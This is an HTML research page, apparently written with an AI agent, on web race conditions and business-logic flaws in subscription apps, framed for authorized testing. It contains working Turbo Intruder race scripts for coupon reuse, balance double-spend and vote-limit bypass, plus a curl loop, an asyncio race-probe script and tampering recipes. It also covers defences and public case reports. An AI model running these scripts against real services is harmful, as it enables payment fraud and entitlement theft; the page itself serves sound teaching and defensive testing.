@@ -1,0 +1,421 @@
+<!doctype html><html><head><meta charset="utf-8">
+<title>Race Conditions and Advanced Business Logic: Deep-Dive Research</title><style>
+body{background:#0d1117;color:#e6edf3;font-family:system-ui;max-width:860px;margin:0 auto;padding:64px 24px 40px;line-height:1.65}
+h1{color:#f0b429;border-bottom:2px solid #30363d;padding-bottom:10px}
+h2{color:#58a6ff;margin-top:36px;border-bottom:1px solid #21262d;padding-bottom:6px}
+h3{color:#3fb950}
+a{color:#58a6ff}code{background:#161b22;padding:2px 7px;border-radius:5px;color:#f0b429;font-size:.9em}
+pre{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;overflow-x:auto}
+pre code{background:none;padding:0;color:#e6edf3}
+table{border-collapse:collapse;width:100%;margin:16px 0}
+th,td{border:1px solid #30363d;padding:8px 12px;text-align:left}
+th{background:#161b22;color:#f0b429}
+blockquote{border-left:3px solid #f0b429;margin:16px 0;padding:8px 20px;background:#161b22;color:#8b949e}
+li{margin:5px 0}
+a.doc{display:block;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 18px;margin:10px 0;color:#58a6ff;text-decoration:none}a.doc:hover{border-color:#f0b429}small{color:#8b949e}
+.pnav{position:fixed;top:0;left:0;right:0;background:#0d1117ee;border-bottom:1px solid #30363d;backdrop-filter:blur(8px);z-index:99;display:flex;align-items:center;gap:14px;padding:10px 24px;font-family:ui-monospace,Consolas,monospace;font-size:13px}
+.pnav .plogo{color:#f0b429;font-weight:700;text-decoration:none;letter-spacing:1px}
+.pnav .pdigits{color:#8b949e;letter-spacing:2px}
+.pnav a.nl{color:#58a6ff;text-decoration:none;margin-left:auto}
+.pnav a.nl:hover{color:#f0b429}
+p.footer,footer{margin-top:48px;padding-top:16px;border-top:1px solid #21262d;color:#8b949e;font-size:12px;font-family:ui-monospace,Consolas,monospace;text-align:center}
+p.footer a,footer a{color:#58a6ff;text-decoration:none}
+.pill{display:inline-block;border-radius:999px;padding:2px 10px;font:11px ui-monospace,Consolas,monospace}
+.pill-ok{background:#3fb95022;color:#3fb950;border:1px solid #3fb95055}
+.pill-run{background:#f0b42922;color:#f0b429;border:1px solid #f0b42955}
+.pill-bad{background:#f8514922;color:#f85149;border:1px solid #f8514955}
+</style></head><body>
+<nav class="pnav"><a class="plogo" href="01 - the-project-individual.html">⬡ PRIME</a><span class="pdigits">1·3·7·9</span><a class="nl" href="00 - PRIME INDEX.html">INDEX ⌕</a></nav><h1 id="race-conditions-and-advanced-business-logic-deep-dive-research">Race Conditions and Advanced Business Logic: Deep-Dive Research</h1>
+<p><strong>Scope:</strong> authorized testing only — the user's own Flask subscription app, local labs, PortSwigger Academy, PayloadsAllTheThings, or explicitly permitted bug-bounty targets.
+<strong>Core model:</strong> a race condition wins when parallel requests observe the same pre-change state and commit conflicting transitions; a business-logic flaw wins when each request is valid but the sequence, state, price, quantity, or entitlement transition violates the intended rule.</p>
+<hr />
+<h2 id="1-race-condition-theory">1. Race-condition theory</h2>
+<h3 id="11-check-then-act-toctou">1.1 Check-then-act / TOCTOU</h3>
+<p>A web race condition occurs when correctness depends on request timing. The dangerous shape is <strong>read-check-decide-write</strong>:
+1. Request A reads <code>coupon.used = false</code>.
+2. Request B reads <code>coupon.used = false</code>.
+3. Both decide the coupon is valid.
+4. Both apply the discount.
+5. Both write <code>coupon.used = true</code>.
+If read and write are not atomic, the "only once" invariant fails. PortSwigger calls limit overruns a subtype of <strong>time-of-check to time-of-use (TOCTOU)</strong> flaws.</p>
+<h3 id="12-time-of-check-vs-time-of-use">1.2 Time-of-check vs time-of-use</h3>
+<ul>
+<li><strong>Time of check:</strong> validation moment — <code>balance &gt;= price</code>, <code>coupon unused</code>, <code>seats_available &gt; 0</code>, <code>trial not claimed</code>, <code>attempt_count &lt; max</code>.</li>
+<li><strong>Time of use:</strong> commit moment — <code>INSERT redemption</code>, <code>UPDATE balance</code>, <code>UPDATE subscription.status</code>, <code>DELETE token</code>, <code>INSERT vote</code>.
+The race window is the interval between them. It may be microseconds or longer if the handler performs multiple DB queries, external API calls, email/SMS delivery, rendering, or sleeps.</li>
+</ul>
+<h3 id="13-why-parallel-requests-break-assumptions">1.3 Why parallel requests break assumptions</h3>
+<p>Sequential tests hide the bug because request 1 commits before request 2 checks. Parallel requests expose assumptions that:
+- one request mutates a resource at a time;
+- Flask/WSGI workers, async tasks, or multiple processes share state safely;
+- cookies/sessions isolate accounts, though two tabs/devices/API calls share one account;
+- route-level locks cover the whole business transaction;
+- webhooks, background jobs, and polling cannot mutate the same row concurrently.</p>
+<h3 id="14-sub-states-and-state-machines">1.4 Sub-states and state machines</h3>
+<p>PortSwigger's "smashing the state machine" research describes temporary <strong>sub-states</strong>: order created but unpaid, coupon checked but not marked used, token generated but not invalidated, subscription upgraded but webhook not reconciled. Another request can act while that sub-state exists.</p>
+<hr />
+<h2 id="2-single-packet-attacks-and-turbo-intruder">2. Single-packet attacks and Turbo Intruder</h2>
+<h3 id="21-network-jitter-and-last-byte-sync">2.1 Network jitter and last-byte sync</h3>
+<p>Firing requests "at once" does not make them arrive together. Network jitter, TLS setup, packet scheduling, and server queues spread arrival times by milliseconds — often enough for request 1 to finish before request 2 starts.</p>
+<p><strong>Last-byte sync</strong> sends every request except its final byte, then releases all final bytes together. It reduces client-side spread but still uses separate connections/streams.</p>
+<h3 id="22-http2-single-packet-attack">2.2 HTTP/2 single-packet attack</h3>
+<p>PortSwigger Research's technique for HTTP/2:
+1. Open one HTTP/2 connection.
+2. Queue 20–30 requests.
+3. Withhold a tiny final fragment from each.
+4. Wait briefly for packets to approach the target.
+5. Send all final fragments; the OS groups them into one TCP packet.
+Requests complete nearly simultaneously regardless of prior jitter. Published benchmark: about <strong>1 ms median spread / 0.3 ms SD</strong> versus <strong>4 ms / 3 ms</strong> for last-byte sync.</p>
+<p>Constraints: best on HTTP/2; HTTP/1.1 needs multiple connections/threaded timing; very large bodies may need first-sequence-sync workarounds. A negative timestamp in Turbo Intruder can indicate the server responded before the request finished sending — evidence of overlap.</p>
+<h3 id="23-burp-repeater-vs-turbo-intruder">2.3 Burp Repeater vs Turbo Intruder</h3>
+<p>Burp Suite Professional 2023.9+ groups tabs and sends them in parallel: HTTP/1 uses last-byte sync; HTTP/2 uses single-packet attack. "Trigger race conditions" automates common labs. Burp Community lacks this native workflow, so use Turbo Intruder, <code>curl</code> parallel jobs, Python <code>asyncio</code>/<code>aiohttp</code>, or HTTP/2 tools.</p>
+<h3 id="24-turbo-intruder-coupon-reuse">2.4 Turbo Intruder: coupon reuse</h3>
+<p>Use on <code>POST /api/coupon/redeem</code> or equivalent.</p>
+<pre><code class="language-python">def queueRequests(target, wordlists):
+    # HTTP/2 target: Engine.BURP2 + one connection = single-packet attack.
+    # HTTP/1.1 target: use Engine.THREADED or Engine.BURP with many connections.
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+    # target.req must contain the coupon body, e.g. {&quot;code&quot;:&quot;SAVE50&quot;}.
+    for i in range(30):
+        engine.queue(target.req, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    if req.status in (200, 201, 202) or 'success' in req.response.lower():
+        table.add(req)
+</code></pre>
+<p>Signal: many successes instead of one success plus "already used". Verify server-side balance/discount/coupon ledger.</p>
+<h3 id="25-turbo-intruder-balance-double-spend">2.5 Turbo Intruder: balance double-spend</h3>
+<p>Use on <code>POST /api/withdraw</code>, <code>/transfer</code>, <code>/balance/spend</code>, or any check-balance-then-debit endpoint.</p>
+<pre><code class="language-python">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+    # Example body: {&quot;amount&quot;:10.00,&quot;destination&quot;:&quot;acct_b&quot;}
+    # If the app uses an idempotency-looking field, test both fixed and unique values.
+    for i in range(25):
+        engine.queue(target.req, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    if req.status == 200 or 'success' in req.response.lower():
+        table.add(req)
+</code></pre>
+<p>Verify final balance and ledger: total debits must not exceed starting balance.</p>
+<h3 id="26-turbo-intruder-votelike-limit-bypass">2.6 Turbo Intruder: vote/like limit bypass</h3>
+<p>Use on <code>POST /api/posts/123/vote</code>, <code>/like</code>, <code>/follow</code>, <code>/join</code>, <code>/claim</code>.</p>
+<pre><code class="language-python">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+    # Capture one legitimate vote/claim request. If CSRF tokens are per-request,
+    # adapt this template to obtain fresh tokens or target a token-free API.
+    for i in range(20):
+        engine.queue(target.req, gate='vote_race')
+    engine.openGate('vote_race')
+
+def handleResponse(req, interesting):
+    if req.status == 200 and ('voted' in req.response.lower()
+                              or 'liked' in req.response.lower()
+                              or 'success' in req.response.lower()):
+        table.add(req)
+</code></pre>
+<p>For multi-endpoint races, queue different requests under separate gates and synchronize them, e.g. <code>POST /cart</code> with <code>POST /cart/checkout</code>, or login with admin access.</p>
+<hr />
+<h2 id="3-race-condition-targets-in-subscription-apps">3. Race-condition targets in subscription apps</h2>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Typical check</th>
+<th>Race consequence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Coupon/promo redeem</td>
+<td><code>coupon.used == false</code></td>
+<td>Discount applied many times or negative total</td>
+</tr>
+<tr>
+<td>Gift card/credit redeem</td>
+<td>card/balance unused</td>
+<td>Balance credited N times</td>
+</tr>
+<tr>
+<td>Free trial claim</td>
+<td><code>trial_claimed == false</code></td>
+<td>Multiple trial periods/plan grants</td>
+</tr>
+<tr>
+<td>Referral bonus</td>
+<td><code>referral.applied == false</code></td>
+<td>Repeated or self-referral payout</td>
+</tr>
+<tr>
+<td>Upgrade/downgrade</td>
+<td>current plan/status read</td>
+<td>Higher entitlement with lower billing</td>
+</tr>
+<tr>
+<td>Refund + access</td>
+<td>refund vs subscription status</td>
+<td>Refund succeeds while premium remains</td>
+</tr>
+<tr>
+<td>Cancel/reactivate</td>
+<td>subscription transition</td>
+<td>New trial, retained access, duplicate sub</td>
+</tr>
+<tr>
+<td>Family/team seats</td>
+<td><code>seat_count &lt; max</code></td>
+<td>Oversell seats or negative seat price</td>
+</tr>
+<tr>
+<td>Password-reset token</td>
+<td>token valid/unused</td>
+<td>Token reuse or multiple resets</td>
+</tr>
+<tr>
+<td>Invite/email verify</td>
+<td>token unused</td>
+<td>One invite consumed by many accounts</td>
+</tr>
+<tr>
+<td>Loyalty points</td>
+<td><code>points &gt;= cost</code></td>
+<td>Points spent/duplicated multiple times</td>
+</tr>
+<tr>
+<td>CAPTCHA/rate limit</td>
+<td>attempts below threshold</td>
+<td>Brute-force/OTP bypass</td>
+</tr>
+<tr>
+<td>Inventory/seat reserve</td>
+<td><code>available &gt; 0</code></td>
+<td>Overselling limited plans</td>
+</tr>
+<tr>
+<td>Webhook replay</td>
+<td>event not processed</td>
+<td>Duplicate grants/revocations</td>
+</tr>
+</tbody>
+</table>
+<p>Flask warning pattern:</p>
+<pre><code class="language-python">if coupon.used:
+    return error
+coupon.used = True
+order.discount = coupon.value
+</code></pre>
+<p>Another request can pass <code>if coupon.used</code> before the first commits. Fix with atomic conditional update, transaction lock, or unique constraint.</p>
+<hr />
+<h2 id="4-detection-methodology">4. Detection methodology</h2>
+<h3 id="41-predict-collisions">4.1 Predict collisions</h3>
+<p>Look for endpoints that change money, credits, seats, plan, role, trial state, or access; enforce "once/first/only/max/per-user" rules; read state, call another service, then write; share session/account state across routes; or have async webhook/background processing.
+Ask: <strong>what two requests could both pass the same check?</strong></p>
+<h3 id="42-probe-for-clues">4.2 Probe for clues</h3>
+<p>Signals: response time differs between first/duplicate requests; multiple DB queries or external calls; frontend disables button but backend accepts replay; "already used" appears only after delay; websocket/polling lags POST; webhook processing is async; admin/support and user actions touch the same subscription; session locks do not cover payment endpoints.</p>
+<h3 id="43-prove-the-concept">4.3 Prove the concept</h3>
+<ol>
+<li>Send two identical requests manually in Repeater.</li>
+<li>Compare sequential vs parallel responses.</li>
+<li>Repeat 5–10 times; races are probabilistic.</li>
+<li>Increase batch size only after anomalies appear.</li>
+<li>Compare <strong>state delta vs response count</strong>: 10 successes but 1 credit means reconciled; 10 successes and 10 credits means bug.</li>
+</ol>
+<h3 id="44-burp-pro-workflow">4.4 Burp Pro workflow</h3>
+<p>Capture request → Repeater → duplicate tab 10–30× → add tabs to group → <strong>Send group in parallel</strong> → Burp chooses last-byte sync (HTTP/1) or single-packet attack (HTTP/2) → inspect response order/status/body → verify state.</p>
+<h3 id="45-communitycli-workaround">4.5 Community/CLI workaround</h3>
+<pre><code class="language-bash">for i in $(seq 1 30); do
+  curl -sS -b cookies.txt -H 'Content-Type: application/json' \
+    -d '{&quot;code&quot;:&quot;SAVE50&quot;}' -o &quot;resp_$i.txt&quot; \
+    -w &quot;%{http_code} %{time_total}\n&quot; \
+    http://127.0.0.1:5000/api/coupon/redeem &amp;
+done
+wait
+</code></pre>
+<p>Python <code>asyncio</code>/<code>aiohttp</code> gives better collection/diffing.</p>
+<hr />
+<h2 id="5-asyncio-attack-script-template">5. Asyncio attack script template</h2>
+<p>Baseline concurrency probe for the Flask app. It is not guaranteed single-packet timing; use Turbo Intruder/HTTP/2 tooling for the strongest sync.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Fire N concurrent requests and diff responses.
+Usage: python3 race_probe.py http://127.0.0.1:5000 /api/coupon/redeem '{&quot;code&quot;:&quot;SAVE50&quot;}' 'session=COOKIE' 30
+&quot;&quot;&quot;
+import asyncio, aiohttp, collections, json, sys, time
+
+async def one(session, idx, url, payload, headers):
+    t = time.perf_counter()
+    try:
+        async with session.post(url, json=payload, headers=headers) as r:
+            body = await r.text()
+            return {&quot;idx&quot;: idx, &quot;status&quot;: r.status,
+                    &quot;ms&quot;: (time.perf_counter()-t)*1000,
+                    &quot;body&quot;: body[:1000], &quot;ok&quot;: r.status in (200,201,202)}
+    except Exception as e:
+        return {&quot;idx&quot;: idx, &quot;status&quot;: -1,
+                &quot;ms&quot;: (time.perf_counter()-t)*1000,
+                &quot;body&quot;: repr(e), &quot;ok&quot;: False}
+
+async def main():
+    if len(sys.argv) &lt; 5:
+        print(__doc__); return 2
+    base, path, payload_s, cookie = sys.argv[1:5]
+    count = int(sys.argv[5]) if len(sys.argv) &gt; 5 else 30
+    url = base.rstrip(&quot;/&quot;) + path
+    payload = json.loads(payload_s)
+    headers = {&quot;Content-Type&quot;:&quot;application/json&quot;, &quot;Cookie&quot;:cookie,
+               &quot;User-Agent&quot;:&quot;race-probe/1.0&quot;, &quot;Accept&quot;:&quot;application/json&quot;}
+    timeout = aiohttp.ClientTimeout(total=15)
+    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as s:
+        results = await asyncio.gather(*[
+            one(s, i, url, payload, headers) for i in range(count)
+        ])
+    ok = [r for r in results if r[&quot;ok&quot;]]
+    print(f&quot;target={url} requests={len(results)} ok={len(ok)}&quot;)
+    print(&quot;status_counts:&quot;, dict(collections.Counter(r[&quot;status&quot;] for r in results)))
+    print(&quot;body_groups:&quot;)
+    for body, n in collections.Counter(r[&quot;body&quot;][:160] for r in results).most_common(10):
+        print(f&quot;  {n:3d} x {body!r}&quot;)
+    print(&quot;\ninteresting responses:&quot;)
+    for r in results:
+        low = r[&quot;body&quot;].lower()
+        if r[&quot;ok&quot;] or any(x in low for x in (&quot;success&quot;,&quot;redeemed&quot;,&quot;applied&quot;,&quot;credited&quot;,&quot;already&quot;)):
+            print(f&quot;#{r['idx']:02d} status={r['status']} time={r['ms']:.1f}ms body={r['body'][:300]!r}&quot;)
+    if len(ok) &gt; 1:
+        print(&quot;\nPOSSIBLE RACE: multiple requests returned success. Verify server-side state.&quot;)
+    return 0
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(asyncio.run(main()))
+</code></pre>
+<p>Adapt for CSRF tokens, cookies, or JSON/form bodies. Verify DB state, not just HTTP responses.</p>
+<hr />
+<h2 id="6-business-logic-deep-patterns">6. Business-logic deep patterns</h2>
+<p>Business-logic flaws use valid requests in invalid order/quantity/state/context.</p>
+<h3 id="61-workflow-step-skipping">6.1 Workflow step skipping</h3>
+<p>Map every step, replay each independently, reorder/remove steps, and call final/confirmation endpoints directly. Examples: <code>GET /cart/order-confirmation?order-confirmed=true</code> without paying, <code>POST /subscription/activate</code> without payment, premium route before email verification. Server-side state, not URL flags, must authorize completion.</p>
+<h3 id="62-price-oracle-attacks">6.2 Price oracle attacks</h3>
+<p>A price oracle reveals or bounds the real price through responses. Look for hidden <code>price_id</code>s, coupon validators returning final price, preview-vs-charge mismatches, and status/error differences. Tamper <code>plan_id</code>, <code>price_id</code>, <code>amount</code>, <code>currency</code>, <code>quantity</code>, <code>coupon</code>, <code>billing_interval</code>; compare UI total, order record, payment amount, and entitlement. Binary-search thresholds when errors distinguish "too expensive" from "invalid".</p>
+<h3 id="63-currency-and-rounding-abuse">6.3 Currency and rounding abuse</h3>
+<p>Test pay-one-currency/refund-another, negative/zero amounts, fractional minor units, rounding direction differences, double conversion, tax/discount before vs after rounding, <code>float</code> prices vs integer cents, and dollar/cents mismatches.</p>
+<h3 id="64-negative-zero-huge-overflow-quantities">6.4 Negative, zero, huge, overflow quantities</h3>
+<p>Try <code>quantity=-1</code>, <code>0</code>, <code>1.5</code>, <code>1.9</code>, <code>NaN</code>, <code>1e309</code>, values near <code>2^31-1</code>/<code>2^63-1</code>, mixed positive/negative line items, body-vs-URL quantity conflicts, and decimal seat counts. PortSwigger's low-level lab uses 32-bit overflow; HackerOne 364843 used negative quantity.</p>
+<h3 id="65-referral-loyalty-and-bonus-abuse">6.5 Referral, loyalty, and bonus abuse</h3>
+<p>Test self-referral, multiple referral codes, reward before referee conversion, points spent twice via race, client-controlled conversion rate/cost, signup credits on duplicate accounts, per-account promos across aliases, and bonuses before required verification.</p>
+<hr />
+<h2 id="7-subscription-specific-logic-attacks">7. Subscription-specific logic attacks</h2>
+<ul>
+<li><strong>Downgrade keeping premium:</strong> <code>PATCH plan=free</code>, cancel with future <code>premium_until</code>, stale cached plan/JWT/cookie entitlement, webhook race.</li>
+<li><strong>Cancel-then-refund-keep:</strong> refund and cancel concurrently/reversed; check whether refund revokes access and cancellation preserves it.</li>
+<li><strong>Trial extension loops:</strong> cancel/reactivate, delete/re-register, email aliases, manipulate <code>trial_days</code>/<code>trial_end</code>, multiple subscriptions/seats, race trial start vs deletion.</li>
+<li><strong>Family/team seats:</strong> exceed purchased seats, decimal seats (<code>1.9</code> rounds up but bills integer part), invite race, transfer/remove/re-add, shared seat across devices, downgrade while members retain access.</li>
+<li><strong>Proration exploits:</strong> upgrade→downgrade→refund, interval changes, seat changes near period end, coupons/refunds during proration, negative invoice/credit amounts, client-supplied timestamps.</li>
+<li><strong>Grace-period abuse:</strong> use premium after failed payment, cancel/reactivate during dunning, reset grace repeatedly, race <code>invoice.payment_failed</code> webhook vs entitlement check, multiple subscriptions masking failure.</li>
+</ul>
+<hr />
+<h2 id="8-defense-side">8. Defense side</h2>
+<h3 id="81-atomic-check-and-set">8.1 Atomic check-and-set</h3>
+<p>Bad: <code>if not coupon.used: apply(); coupon.used=True</code>.
+Better: transaction + row lock or single conditional update.</p>
+<pre><code class="language-python">with db.session.begin():
+    coupon = db.session.query(Coupon).filter_by(code=code).with_for_update().one()
+    if coupon.used_count &gt;= coupon.max_uses:
+        raise InvalidCoupon()
+    apply_discount(order)
+    coupon.used_count += 1
+    db.session.add(CouponRedemption(user_id=user.id, coupon_id=coupon.id))
+</code></pre>
+<pre><code class="language-sql">UPDATE coupons SET used_count = used_count + 1
+WHERE code = :code AND used_count &lt; max_uses RETURNING id;
+</code></pre>
+<p>Per-user once-only redemption:</p>
+<pre><code class="language-sql">INSERT INTO coupon_redemptions (user_id, coupon_id)
+VALUES (:user_id, :coupon_id)
+ON CONFLICT (user_id, coupon_id) DO NOTHING RETURNING id;
+</code></pre>
+<h3 id="82-transactions-locks-constraints">8.2 Transactions, locks, constraints</h3>
+<ul>
+<li>Keep financial mutations in DB transactions.</li>
+<li>Use <code>SELECT ... FOR UPDATE</code>, Postgres advisory locks, or serializable isolation for high-risk operations.</li>
+<li>Keep transactions short; avoid slow external calls inside them.</li>
+<li>Add constraints: <code>UNIQUE(user_id,coupon_id)</code>, <code>UNIQUE(order_id,payment_event_id)</code>, <code>CHECK(quantity&gt;0)</code>, <code>CHECK(amount&gt;=0)</code>, <code>CHECK(balance&gt;=0)</code>, <code>CHECK(seat_count&lt;=purchased_seats)</code>.</li>
+</ul>
+<h3 id="83-idempotency-keys">8.3 Idempotency keys</h3>
+<p>For payment/refund/redeem/transfer/seat/webhook endpoints, require <code>Idempotency-Key</code>; store <code>(user_id, endpoint, key)</code> uniquely plus request fingerprint/response; replay returns same result; reject same key with different payload.</p>
+<h3 id="84-rate-limits-and-state-machines">8.4 Rate limits and state machines</h3>
+<p>Rate-limit by authenticated user/account/coupon/endpoint/action, not just IP; use atomic counters. Define explicit subscription states (<code>trialing→active→past_due→canceled→expired</code>, <code>created→paid→active</code>) and reject invalid transitions server-side.</p>
+<h3 id="85-webhooks-audit-anomalies">8.5 Webhooks, audit, anomalies</h3>
+<p>Verify webhook signatures, deduplicate event IDs, process idempotently, reconcile provider state, never grant entitlement from browser redirect alone. Log actor/object IDs, before/after balance/plan/coupon/seat/trial, request ID, idempotency key, webhook event. Alert on repeated redemptions, negative balance, entitlement without payment, rapid plan changes, refund/cancel loops, coupon overuse.</p>
+<hr />
+<h2 id="9-real-writeups-and-cases">9. Real writeups and cases</h2>
+<ul>
+<li><strong>Stripe unlimited discount redemption:</strong> Turbo Intruder called accept-discount 30× in parallel; $20k discount became ~$600k fee-free value. First fix still raced; final fix made redemption atomic. https://www.hackerone.com/blog/how-business-logic-vulnerability-led-unlimited-discount-redemption</li>
+<li><strong>Reverb gift-card multi-redeem:</strong> ~30 concurrent redemptions produced multiple credits from one card. https://hackerone.com/reports/759247</li>
+<li><strong>Keybase invitation races:</strong> 115007 bypassed invite limit; 148609 registered multiple users with one invite. https://hackerone.com/reports/115007 · https://hackerone.com/reports/148609 · https://www.josipfranjkovic.com/blog/race-conditions-on-web</li>
+<li><strong>GitLab CVE-2022-4037:</strong> race led to verified-email forgery/account takeover via OAuth; demonstrated with single-packet methodology. https://portswigger.net/research/smashing-the-state-machine · https://nvd.nist.gov/vuln/detail/cve-2022-4037</li>
+<li><strong>Upserve negative quantity:</strong> order JSON accepted negative quantity and reduced total. https://hackerone.com/reports/364843</li>
+<li><strong>Krisp decimal seats:</strong> <code>1.9</code> seats added two seats but billed integer portion. https://hackerone.com/reports/1446090</li>
+<li><strong>lemlist failed payment:</strong> user kept paid features after failed payments/cancel. https://hackerone.com/reports/1420697</li>
+<li><strong>Rounding/salami:</strong> HackerOne 176461 credited receiver without debiting sender below precision; PAT summary: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md</li>
+<li><strong>HackerOne fee rounding:</strong> report 808975 used micro-values to expose rounding/fee evasion. https://hackerone.com/reports/808975</li>
+</ul>
+<hr />
+<h2 id="10-lab-mapping">10. Lab mapping</h2>
+<h3 id="portswigger-race-conditions">PortSwigger Race Conditions</h3>
+<p>Topic: https://portswigger.net/web-security/race-conditions
+1. Limit overrun race conditions — coupon/gift-card TOCTOU.
+2. Bypassing rate limits via race conditions — failed-login counter race.
+3. Multi-endpoint race conditions — align different requests.
+4. Single-endpoint race conditions — deeper state-machine collision.
+5. Exploiting time-sensitive vulnerabilities — reset-token timing.
+6. Partial construction race conditions — access partially initialized objects.</p>
+<p>Labs:
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities
+- https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction</p>
+<h3 id="portswigger-business-logic">PortSwigger Business Logic</h3>
+<p>Topic: https://portswigger.net/web-security/logic-flaws
+Most relevant: Excessive trust in client-side controls; High-level logic vulnerability; Low-level logic flaw; Inconsistent security controls; Flawed enforcement of business rules; Inconsistent handling of exceptional input; Infinite money logic flaw; Insufficient workflow validation; Weak isolation on dual-use endpoint; Authentication bypass via flawed state machine; Authentication bypass via encryption oracle.</p>
+<h3 id="payloadsallthethings">PayloadsAllTheThings</h3>
+<ul>
+<li>Race Condition: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md — limit overrun, rate-limit bypass, last-byte sync, single-packet attack, Turbo Intruder/Raceocat/h2spacex.</li>
+<li>Business Logic Errors: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md — coupons, delivery fees, currency arbitrage, premium/refund abuse, negative quantities, rounding.</li>
+</ul>
+<h3 id="flask-app-practice-path">Flask app practice path</h3>
+<ol>
+<li>Map signup/trial/checkout/webhook/cancel/refund/plan-change/seats/coupons/balance.</li>
+<li>Write each invariant: "only one redemption", "balance cannot go negative", "plan must match payment", "seats cannot exceed purchased".</li>
+<li>Test sequentially, then parallel.</li>
+<li>Try workflow skips before price tampering; price/quantity/currency tampering before races.</li>
+<li>Combine classes: plan change vs webhook reconciliation, refund vs entitlement revocation.</li>
+<li>Verify DB/logs, not just responses.</li>
+</ol>
+<hr />
+<h2 id="sources">Sources</h2>
+<ul>
+<li>PortSwigger Race Conditions: https://portswigger.net/web-security/race-conditions</li>
+<li>PortSwigger Research, Smashing the state machine: https://portswigger.net/research/smashing-the-state-machine</li>
+<li>PortSwigger Research, Single-packet attack: https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local</li>
+<li>PortSwigger Business Logic: https://portswigger.net/web-security/logic-flaws</li>
+<li>Turbo Intruder race docs: https://github.com/PortSwigger/turbo-intruder/blob/master/docs/race-conditions.md</li>
+<li>Turbo Intruder example: https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py</li>
+<li>PayloadsAllTheThings Race Condition: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md</li>
+<li>PayloadsAllTheThings Business Logic Errors: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md</li>
+<li>OWASP Business Logic Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html</li>
+<li>HackerOne/Stripe discount redemption: https://www.hackerone.com/blog/how-business-logic-vulnerability-led-unlimited-discount-redemption</li>
+<li>HackerOne reports: 759247, 115007, 148609, 364843, 1446090, 1420697, 808975 (links above)</li>
+<li>CVE-2022-4037: https://nvd.nist.gov/vuln/detail/cve-2022-4037</li>
+</ul>
+<hr style="border-color:#30363d;margin-top:50px"><p style="color:#8b949e;font-size:13px">Nello Gem / Neilbert G. Carillo × Devin — converted from race_and_logic.md</p>
+<footer>⬡ NELLOGEM PRIME FORMULA · doc 09 · <a href="00 - PRIME INDEX.html">back to index</a></footer>
+<a href="http://localhost:8088/world" style="position:fixed;left:14px;bottom:14px;z-index:99999;background:rgba(5,7,15,.88);border:1px solid rgba(125,211,252,.4);color:#7dd3fc;padding:8px 14px;border-radius:10px;font:600 12px monospace;text-decoration:none;backdrop-filter:blur(8px);box-shadow:0 0 18px -4px rgba(125,211,252,.4)">🌌 PARALLEL WORLD</a></body></html>
